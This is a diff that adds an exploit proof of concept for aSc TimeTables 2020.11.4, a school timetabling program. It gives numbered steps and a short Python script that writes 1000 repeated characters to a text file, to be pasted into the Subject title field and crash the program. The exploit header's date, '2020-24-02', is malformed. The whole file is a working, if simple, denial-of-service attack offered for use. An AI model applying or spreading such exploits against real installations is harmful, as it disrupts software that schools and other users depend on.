@@ -1,0 +1,32 @@
+# Exploit Title: aSc TimeTables 2020.11.4 - Denial of Service (PoC)
+# Date: 2020-24-02
+# Exploit Author: Ismael Nava
+# Vendor Homepage: https://www.asctimetables.com/#!/home
+# Software Link: https://www.asctimetables.com/#!/home/download
+# Version: 2020.11.4
+# Tested on: Windows 10 Home x64
+# CVE : n/a
+
+# STEPS
+# Open the program aSc Timetables 2020
+# In File select the option New
+# Put any letter in the fiel Name of the Schooland click Next
+# In the next Windows click NEXT
+# In the Step 3, in Subject click in New 
+# Run the python exploit script, it will create a new .txt files
+# Copy the content of the file "Tables.txt"
+# Paste the content in the field Subject title
+# Click in OK
+# End :)
+
+
+buffer = 'Z' * 1000
+
+try: 
+    file = open("Tables.txt","w")
+    file.write(buffer)
+    file.close()
+
+    print("Archive ready")
+except:
+    print("Archive no ready")
